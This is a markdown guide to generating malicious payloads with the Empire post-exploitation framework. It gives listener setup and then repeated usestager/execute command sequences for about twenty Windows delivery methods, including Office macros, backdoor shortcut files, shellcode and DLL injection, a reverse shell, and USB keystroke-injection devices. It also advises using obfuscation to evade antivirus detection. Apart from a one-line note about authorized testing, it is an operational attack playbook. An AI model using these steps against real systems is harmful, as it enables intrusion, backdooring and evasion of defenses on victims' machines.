
# Empire BC - PowerShell Payload Generation Guide

This document provides a detailed guide to generating PowerShell payloads using the Empire BC post-exploitation framework. 
The steps and commands are sourced from the official documentation and credible examples.

------------------------------------------------------------------------------------------------------------------------------------------------------------

## Setting Up a Listener

Before generating a payload, you must configure a listener. The listener acts as the point of communication between the payload and the Empire server.

1. **List Available Listeners**:
    ```bash
    listeners
    ```

2. **Create an HTTP Listener**:
    ```bash
    uselistener http
    ```

3. **Configure Listener Settings**:
    ```bash
    set Name MyHttpListener
    set Port 8080
    execute
    ```

------------------------------------------------------------------------------------------------------------------------------------------------------------

## Generating PowerShell Payloads with Empire BC

### Inline PowerShell Payload with Empire BC
This payload generates an inline PowerShell script for direct execution using Empire BC.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_bat
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Inline PowerShell Payload with Obfuscation in Empire BC
This payload creates an obfuscated inline PowerShell script for evading detection.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_bat
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    set Obfuscate True
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows LNK Payload Launcher for Stealth Execution with Empire BC
This payload generates a Windows shortcut file (.lnk) for stealthy payload execution.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_lnk
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows Command Execution via CMD for Remote Payloads with Empire BC
This payload creates a command execution script to trigger remote payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_cmd_exec
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Bunny Exploit Payload for Windows Execution with Empire BC
This payload utilizes a Bunny script for payload execution on Windows systems.

1. **Select the Stager**:
    ```bash
    usestager windows_bunny
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### In-Memory Shellcode Injection for Windows Systems with Empire BC
This payload injects shellcode directly into memory for stealthy execution.

1. **Select the Stager**:
    ```bash
    usestager windows_shellcode
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Macro-Based Payload Execution in Windows Office Apps with Empire BC
This payload generates malicious macros for execution in Office applications.

1. **Select the Stager**:
    ```bash
    usestager windows_macro
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### DLL Injection for Windows Payload Delivery with Empire BC
This payload facilitates DLL injection for delivering payloads on Windows systems.

1. **Select the Stager**:
    ```bash
    usestager windows_dll
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### C# Executable Payload for Windows Execution with Empire BC
This payload compiles a C# executable for payload deployment.

1. **Select the Stager**:
    ```bash
    usestager windows_csharp_exe
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### HTA-Based Payload Execution for Windows Targets with Empire BC
This payload creates an HTA file for exploitation of Windows targets.

1. **Select the Stager**:
    ```bash
    usestager windows_hta
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows Script Command (.SCT) Payload Launcher with Empire BC
This payload generates a Windows script command (.SCT) file for execution.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_sct
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------

### XML Payload Launcher for Windows Systems with Empire BC
This payload generates an XML file for deploying Empire BC payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_xml
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
------------------------------------------------------------------------------------------------------------------------------------------------------------

### Backdoor LNK & Macro Combination Payload for Windows with Empire BC
This payload combines LNK and macro techniques for backdoor deployment.

1. **Select the Stager**:
    ```bash
    usestager windows_backdoorlnkmacro
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
        
------------------------------------------------------------------------------------------------------------------------------------------------------------   

### VBScript-Based Payload Launcher for Windows Systems with Empire BC
This payload creates a VBScript file for payload execution on Windows systems.

1. **Select the Stager**:
    ```bash
    usestager windows_launcher_vbs
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------ 

### Reverse Shell Payload for Windows Systems with Empire BC
This payload establishes a reverse shell connection back to the Empire server.

1. **Select the Stager**:
    ```bash
    usestager windows_reverseshell
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------ 

### Teensy USB Exploit for Payload Delivery on Windows with Empire BC
This payload uses Teensy USB devices to deliver malicious payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_teensy
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------ 

### WMIC Command Execution Payload for Windows with Empire BC
This payload leverages WMIC commands for payload execution on Windows systems.

1. **Select the Stager**:
    ```bash
    usestager windows_wmic
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```
    
------------------------------------------------------------------------------------------------------------------------------------------------------------ 

### Nim Language-Based Payload Execution for Windows with Empire BC
This payload generates a Nim language script for execution on Windows systems.

1. **Select the Stager**:
    ```bash
    usestager windows_nim
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```

------------------------------------------------------------------------------------------------------------------------------------------------------------

### USB Rubber Ducky Payload for Windows Systems with Empire BC
This payload creates a Rubber Ducky script for delivering Empire BC payloads.

1. **Select the Stager**:
    ```bash
    usestager windows_ducky
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```

------------------------------------------------------------------------------------------------------------------------------------------------------------

### Cross-Platform Payload Builder with PyInstaller with Empire BC
This payload builds a cross-platform executable using PyInstaller for payload delivery.

1. **Select the Stager**:
    ```bash
    usestager multi_pyinstaller
    ```

2. **Bind the Stager to the Listener**:
    ```bash
    set Listener MyHttpListener
    execute
    ```

------------------------------------------------------------------------------------------------------------------------------------------------------------

## Notes and Best Practices

- Always ensure your listener is active before executing the payload.
- Use obfuscation options to avoid detection by antivirus software.
- Payloads should only be used in authorized penetration testing or research environments.

For more information, visit the [Empire BC Official Documentation](https://bc-security.gitbook.io/empire-wiki).
